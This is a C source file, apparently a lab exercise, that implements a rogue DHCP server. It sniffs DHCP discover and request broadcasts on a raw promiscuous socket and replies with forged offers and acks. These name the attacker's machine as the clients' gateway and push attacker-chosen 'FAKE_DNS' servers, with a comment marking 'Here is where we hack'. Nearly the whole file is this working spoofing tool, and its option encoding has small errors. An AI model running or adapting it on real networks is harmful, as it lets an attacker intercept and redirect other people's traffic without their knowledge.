#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <errno.h>
#include "raw.h"

void get_interface_index();
void get_interface_mac();
void get_interface_ip();
void print_dhcp_rcv_packet();
void print_dhcp_send_packet();

const uint8_t dhcp_magic_cookie[4] = {0X63, 0X82, 0X53, 0X63};
char broadcast_mac[6] =	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
const char* dhcp_message_types[19] = {"", DHCP_DISCOVER_NAME, "DHCPOFFER", DHCP_REQUEST_NAME, "DHCPDECLINE", "DHCPACK",
"DHCPNAK", "DHCPRELEASE", "DHCPINFORM", "DHCPFORCERENEW", "DHCPLEASEQUERY", "DHCPLEASEUNASSIGNED", 
"DHCPLEASEUNKNOWN", "DHCPLEASEACTIVE", "DHCPBULKLEASEQUERY", "DHCPLEASEQUERYDONE", 
"DHCPACTIVELEASEQUERY", "DHCPLEASEQUERYSTATUS", "DHCPTLS"};

const char* FAKE_DNS_1 = "8.8.8.8";
const char* FAKE_DNS_2 = "8.8.4.4";

int sockfd, numbytes;
struct ifreq ifopts, if_idx, if_mac, if_ip;
struct sockaddr_ll socket_address;

char* interface_ip;
uint8_t interface_mac[6]; 
uint8_t mac_dest[6];
char interface_name[IFNAMSIZ];
	
uint8_t rcv_buffer[ETH_LEN];
struct eth_frame_s *raw_rcv = (struct eth_frame_s *)&rcv_buffer;
struct dhcp_message *rcv_dhcp = (struct dhcp_message *)&rcv_buffer[42];

uint8_t send_buffer[347];
struct eth_frame_s *raw_send = (struct eth_frame_s *)&send_buffer;
struct dhcp_message *send_dhcp = (struct dhcp_message *)&send_buffer[42];

unsigned short in_cksum(unsigned short *addr,int len)
{
        register int sum = 0;
        u_short answer = 0;
        register u_short *w = addr;
        register int nleft = len;

        /*
         * Our algorithm is simple, using a 32 bit accumulator (sum), we add
         * sequential 16 bit words to it, and at the end, fold back all the
         * carry bits from the top 16 bits into the lower 16 bits.
         */
        while (nleft > 1)  {
                sum += *w++;
                nleft -= 2;
        }

        /* mop up an odd byte, if necessary */
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w ;
                sum += answer;
        }

        /* add back carry outs from top 16 bits to low 16 bits */
        sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;                          /* truncate to 16 bits */
        return(answer);
}

void build_offer_packet()
{

    // Copy MAC of destination from the received packet
    memcpy(mac_dest, raw_rcv->ethernet.src_addr, 6);
	
    // Starts building offer packet

    // Ethernet header
    memcpy(raw_send->ethernet.dst_addr, mac_dest, 6);
    memcpy(raw_send->ethernet.src_addr, interface_mac, 6);
	//IPv4
	raw_send->ethernet.eth_type = htons(ETH_P_IP);

    // IP header
	int ip_length = 333;
	raw_send->ip.ver = 0x45;
	raw_send->ip.tos = 0;
	raw_send->ip.len = htons(ip_length);
	raw_send->ip.id = htons(0x00);
	raw_send->ip.off = htons(0x00);
	raw_send->ip.ttl = 50;
	raw_send->ip.proto = 0X11;
	raw_send->ip.sum = 0;
	inet_aton(interface_ip, &raw_send->ip.src);
    inet_aton(IP_BROADCAST, &raw_send->ip.dst);
	raw_send->ip.sum = in_cksum((unsigned short*) &raw_send->ip, 20); 


    // UDP header
	int udp_length = 313;
    raw_send->udp.src_port = htons(DHCP_PORT);
    raw_send->udp.dst_port = htons(DHCP_PORT_2);
   	raw_send->udp.udp_len = htons(udp_length);
    raw_send->udp.udp_chksum = 0;
    
	// DHCP message
    send_dhcp->op_code = 2; 
    send_dhcp->htype = 1; 
    send_dhcp->hlen = 6; 
    send_dhcp->hops = 0; 
    send_dhcp->xid = rcv_dhcp->xid;
    send_dhcp->sec = 0;
    send_dhcp->flags = htons(0x0000);
	inet_aton("0.0.0.0", &send_dhcp->ciaddr);
	inet_aton(IP_DEST_PLACEHOLDER, &send_dhcp->yiaddr);
	inet_aton(interface_ip, &send_dhcp->siaddr);
    inet_aton("0.0.0.0", &send_dhcp->giaddr);
    memcpy(send_dhcp->chaddr, mac_dest, 6);
    memcpy(send_dhcp->options, dhcp_magic_cookie, 4);
	
    // DHCP Options
    // Op code
    // Op size
    // Value

    // Define DHCP message type
    send_dhcp->options[4] = 53;   
	send_dhcp->options[5] = 1;      
	send_dhcp->options[6] = 2;      // MESSAGE TYPE 2: OFFER

	// Define DHCP Server ID
	send_dhcp->options[7] = 54;
	send_dhcp->options[8] = 4;
    inet_aton(interface_ip, &send_dhcp->options[9]);

	// Define IP address lease time
    // 3600 seconds, 60 minutes
	send_dhcp->options[13] = 51;
	send_dhcp->options[14] = 4;
	send_dhcp->options[15] = 0;
	send_dhcp->options[16] = 0;
	send_dhcp->options[17] = 0X0E;
	send_dhcp->options[18] = 0X10;

	// Define DHCP renewal time
	send_dhcp->options[19] = 58;
	send_dhcp->options[20] = 4;
	send_dhcp->options[21] = 0;
	send_dhcp->options[22] = 0;
	send_dhcp->options[23] = 0X07;
	send_dhcp->options[24] = 0X08;

	// Define DHCP rebinding time
    // 3150 seconds, 52.5 minutes
	send_dhcp->options[25] = 0X59;
	send_dhcp->options[26] = 4;
	send_dhcp->options[27] = 0;
	send_dhcp->options[28] = 0;
	send_dhcp->options[29] = 0X0C;
	send_dhcp->options[30] = 0X4E;

    // Define Subnet Mask
    send_dhcp->options[31] = 1;      
    send_dhcp->options[32] = 4;
    inet_aton("255.255.255.0", &send_dhcp->options[33]);

	// Define Broadcast Address
	send_dhcp->options[37] = 28;      
    send_dhcp->options[38] = 4;
    inet_aton("192.168.0.255", &send_dhcp->options[39]);

    // Define Router
	send_dhcp->options[43] = 3;
	send_dhcp->options[44] = 4;
    inet_aton(interface_ip, &send_dhcp->options[45]);

    // Define DNS Servers Addresses
    // Here is where we hack 
	send_dhcp->options[49] = 6;
	send_dhcp->options[50] = 8;
	// DNS Addresses	
    inet_aton(FAKE_DNS_1, &send_dhcp->options[51]);
    inet_aton(FAKE_DNS_2, &send_dhcp->options[55]);

	// Client Identifier 
	send_dhcp->options[59] = 61;
	send_dhcp->options[60] = 7;
	send_dhcp->options[61] = 1;
	memcpy(&send_dhcp->options[62], mac_dest, 6);

    // End of options
	send_dhcp->options[68] = 255;

}

void build_ack_packet()
{

    // Copy MAC of destination from the received packet
    memcpy(mac_dest, raw_rcv->ethernet.src_addr, 6);
	
    // Starts building offer packet

    // Ethernet header
    memcpy(raw_send->ethernet.dst_addr, mac_dest, 6);
    memcpy(raw_send->ethernet.src_addr, interface_mac, 6);
	//IPv4
	raw_send->ethernet.eth_type = htons(ETH_P_IP);

    // IP header
	int ip_length = 333;
	raw_send->ip.ver = 0x45;
	raw_send->ip.tos = 0;
	raw_send->ip.len = htons(ip_length);
	raw_send->ip.id = htons(0x00);
	raw_send->ip.off = htons(0x00);
	raw_send->ip.ttl = 50;
	raw_send->ip.proto = 0X11;
	raw_send->ip.sum = 0;
	inet_aton(interface_ip, &raw_send->ip.src);
    inet_aton(IP_BROADCAST, &raw_send->ip.dst);
	raw_send->ip.sum = in_cksum((unsigned short*) &raw_send->ip, 20); 


    // UDP header
	int udp_length = 313;
    raw_send->udp.src_port = htons(DHCP_PORT);
    raw_send->udp.dst_port = htons(DHCP_PORT_2);
   	raw_send->udp.udp_len = htons(udp_length);
    raw_send->udp.udp_chksum = 0;
    
	// DHCP message
    send_dhcp->op_code = 2; 
    send_dhcp->htype = 1; 
    send_dhcp->hlen = 6; 
    send_dhcp->hops = 0; 
    send_dhcp->xid = rcv_dhcp->xid;
    send_dhcp->sec = 0;
    send_dhcp->flags = htons(0x0000);
	inet_aton("0.0.0.0", &send_dhcp->ciaddr);
	inet_aton(IP_DEST_PLACEHOLDER, &send_dhcp->yiaddr);
	inet_aton(interface_ip, &send_dhcp->siaddr);
    inet_aton("0.0.0.0", &send_dhcp->giaddr);
    memcpy(send_dhcp->chaddr, mac_dest, 6);
    memcpy(send_dhcp->options, dhcp_magic_cookie, 4);
	
    // DHCP Options
    // Op code
    // Op size
    // Value

    // Define DHCP message type
    send_dhcp->options[4] = 53;   
	send_dhcp->options[5] = 1;      
	send_dhcp->options[6] = 5;      // MESSAGE TYPE 2: ACK

	// Define DHCP Server ID
	send_dhcp->options[7] = 54;
	send_dhcp->options[8] = 4;
    inet_aton(interface_ip, &send_dhcp->options[9]);

	// Define IP address lease time
    // 3600 seconds, 60 minutes
	send_dhcp->options[13] = 51;
	send_dhcp->options[14] = 4;
	send_dhcp->options[15] = 0;
	send_dhcp->options[16] = 0;
	send_dhcp->options[17] = 0X0E;
	send_dhcp->options[18] = 0X10;

	// Define DHCP renewal time
	send_dhcp->options[19] = 58;
	send_dhcp->options[20] = 4;
	send_dhcp->options[21] = 0;
	send_dhcp->options[22] = 0;
	send_dhcp->options[23] = 0X07;
	send_dhcp->options[24] = 0X08;

	// Define DHCP rebinding time
    // 3150 seconds, 52.5 minutes
	send_dhcp->options[25] = 0X59;
	send_dhcp->options[26] = 4;
	send_dhcp->options[27] = 0;
	send_dhcp->options[28] = 0;
	send_dhcp->options[29] = 0X0C;
	send_dhcp->options[30] = 0X4E;

    // Define Subnet Mask
    send_dhcp->options[31] = 1;      
    send_dhcp->options[32] = 4;
    inet_aton("255.255.255.0", &send_dhcp->options[33]);

	// Define Broadcast Address
	send_dhcp->options[37] = 28;      
    send_dhcp->options[38] = 4;
    inet_aton("192.168.0.255", &send_dhcp->options[39]);

    // Define Router
	send_dhcp->options[43] = 3;
	send_dhcp->options[44] = 4;
    inet_aton(interface_ip, &send_dhcp->options[45]);

    // Define DNS Servers Addresses
    // Here is where we hack 
	send_dhcp->options[49] = 6;
	send_dhcp->options[50] = 8;
	// DNS Addresses	
    inet_aton(FAKE_DNS_1, &send_dhcp->options[51]);
    inet_aton(FAKE_DNS_2, &send_dhcp->options[55]);

	// Client Identifier 
	send_dhcp->options[59] = 61;
	send_dhcp->options[60] = 7;
	send_dhcp->options[61] = 1;
	memcpy(&send_dhcp->options[62], mac_dest, 6);

    // End of options
	send_dhcp->options[68] = 255;

}

int main(int argc, char *argv[])
{
	
	/* Get interface name */
	if (argc > 1)
		strcpy(interface_name, argv[1]);
	else
		strcpy(interface_name, DEFAULT_IF);

	/* Open RAW socket */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
		perror("socket");
	
	/* Set interface to promiscuous mode */
	strncpy(ifopts.ifr_name, interface_name, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFFLAGS, &ifopts);
	ifopts.ifr_flags |= IFF_PROMISC;
	ioctl(sockfd, SIOCSIFFLAGS, &ifopts);

	get_interface_index();
	get_interface_ip();
	get_interface_mac();

	printf("Interface IP: %s\n", interface_ip);

	printf("Interface MAC: ");
	for(int i = 0; i < 6; i++)
    	printf("%02x ", interface_mac[i]);
	printf("\n\n");

	/* End of configuration. Now we can receive data using raw sockets. */

	while (1) {
		
		numbytes = recvfrom(sockfd, rcv_buffer, ETH_LEN, 0, NULL, NULL);
		
		if (raw_rcv->ethernet.eth_type == ntohs(ETH_P_IP)){
			
			if (raw_rcv->ip.proto == PROTO_UDP && (ntohs(raw_rcv->udp.src_port) == DHCP_PORT || ntohs(raw_rcv->udp.src_port) == DHCP_PORT_2)) {
				
                print_dhcp_rcv_packet();

				// Answer to DHCPDISCOVER packets
				if (DHCP_DISCOVER_NAME == dhcp_message_types[rcv_dhcp->options[6]]){
					
                    printf("Sending DHCPOFFER packet\n");
					build_offer_packet();
                    print_dhcp_send_packet();

					memcpy(socket_address.sll_addr, mac_dest, 6);
					if (sendto(sockfd, (char *) send_buffer, 347, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
					    printf("Error sending packet through socket. The reported error is %s\n", strerror(errno));
					else 
					    printf("DHCPOFFER sent\n\n");
				}

				// Answer to DHCPREQUEST packets
				if (DHCP_REQUEST_NAME == dhcp_message_types[rcv_dhcp->options[6]]){
					
                    printf("Sending DHCPACK packet\n");
					build_ack_packet();
                    print_dhcp_send_packet();

					memcpy(socket_address.sll_addr, mac_dest, 6);
					if (sendto(sockfd, (char *) send_buffer, 347, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
					    printf("Error sending packet through socket. The reported error is %s\n", strerror(errno));
					else 
					    printf("DHCPACK packet sent\n\n");
				}

			}
			
			continue;
		}
				
	}

	return 0;
}

void get_interface_index() 
{

	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, interface_name, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
		perror("SIOCGIFINDEX");
	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	socket_address.sll_halen = ETH_ALEN;

}

void get_interface_ip()
{

	memset(&if_ip, 0, sizeof(struct ifreq));
	strncpy(if_ip.ifr_name, interface_name, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFADDR, &if_ip) < 0)
		perror("SIOCGIFADDR");
	interface_ip = inet_ntoa(((struct sockaddr_in *)&if_ip.ifr_addr)->sin_addr);

}

void get_interface_mac()
{

    memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, interface_name, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
		perror("SIOCGIFHWADDR");
	memcpy(interface_mac, if_mac.ifr_hwaddr.sa_data, 6);

}

void print_dhcp_rcv_packet()
{
    printf("Received DHCP Packet:\n");
    printf("Op Code: %d\n", rcv_dhcp->op_code);
    printf("Hardware Type: %d\n", rcv_dhcp->htype);
    printf("Hardware Length: %d\n", rcv_dhcp->hlen);
    printf("Hops: %d\n", rcv_dhcp->hops);
    printf("Transaction ID: %d\n", ntohs(rcv_dhcp->xid));
    printf("Seconds: %d\n", ntohs(rcv_dhcp->sec));
    printf("Flags: %d\n", ntohs(rcv_dhcp->flags));
    printf("Client ip: %d.%d.%d.%d\n", rcv_dhcp->ciaddr[0], rcv_dhcp->ciaddr[1], rcv_dhcp->ciaddr[2], rcv_dhcp->ciaddr[3]);
    printf("Your ip: %d.%d.%d.%d\n", rcv_dhcp->yiaddr[0], rcv_dhcp->yiaddr[1], rcv_dhcp->yiaddr[2], rcv_dhcp->yiaddr[3]);
	printf("Server ip: %d.%d.%d.%d\n", rcv_dhcp->siaddr[0], rcv_dhcp->siaddr[1], rcv_dhcp->siaddr[2], rcv_dhcp->siaddr[3]);
    printf("Gateway ip: %d.%d.%d.%d\n", rcv_dhcp->giaddr[0], rcv_dhcp->giaddr[1], rcv_dhcp->giaddr[2], rcv_dhcp->giaddr[3]);
    printf("DHCP Option: %d - %s\n", rcv_dhcp->options[6], dhcp_message_types[rcv_dhcp->options[6]]);
    printf("Source MAC Address: ");
	for(int i=0;i<6;i++)
    	printf("%02x ", raw_rcv->ethernet.src_addr[i]);
	printf("\n");
    printf("Destination MAC Address: ");
	for(int i=0;i<6;i++)
    	printf("%02x ", raw_rcv->ethernet.dst_addr[i]);
	printf("\n\n");

}

void print_dhcp_send_packet()
{
    printf("Op Code: %d\n", send_dhcp->op_code);
    printf("Hardware Type: %d\n", send_dhcp->htype);
    printf("Hardware Length: %d\n", send_dhcp->hlen);
    printf("Hops: %d\n", send_dhcp->hops);
    printf("Transaction ID: %d\n", ntohs(send_dhcp->xid));
    printf("Seconds: %d\n", ntohs(send_dhcp->sec));
    printf("Flags: %d\n", ntohs(send_dhcp->flags));
    printf("Client ip: %d.%d.%d.%d\n", send_dhcp->ciaddr[0], send_dhcp->ciaddr[1], send_dhcp->ciaddr[2], send_dhcp->ciaddr[3]);
    printf("Your ip: %d.%d.%d.%d\n", send_dhcp->yiaddr[0], send_dhcp->yiaddr[1], send_dhcp->yiaddr[2], send_dhcp->yiaddr[3]);
    printf("Server ip: %d.%d.%d.%d\n", send_dhcp->siaddr[0], send_dhcp->siaddr[1], send_dhcp->siaddr[2], send_dhcp->siaddr[3]);
    printf("Gateway ip: %d.%d.%d.%d\n", send_dhcp->giaddr[0], send_dhcp->giaddr[1], send_dhcp->giaddr[2], send_dhcp->giaddr[3]);
    printf("IP Packet Source: %d.%d.%d.%d\n", raw_send->ip.src[0], raw_send->ip.src[1], raw_send->ip.src[2], raw_send->ip.src[3]);
    printf("IP Packet Dest: %d.%d.%d.%d\n", raw_send->ip.dst[0], raw_send->ip.dst[1], raw_send->ip.dst[2], raw_send->ip.dst[3]);
	printf("DNS 1: %d.%d.%d.%d\n", send_dhcp->options[51], send_dhcp->options[52], send_dhcp->options[53], send_dhcp->options[54]);
	printf("DNS 2: %d.%d.%d.%d\n\n", send_dhcp->options[55], send_dhcp->options[56], send_dhcp->options[57], send_dhcp->options[58]);

}
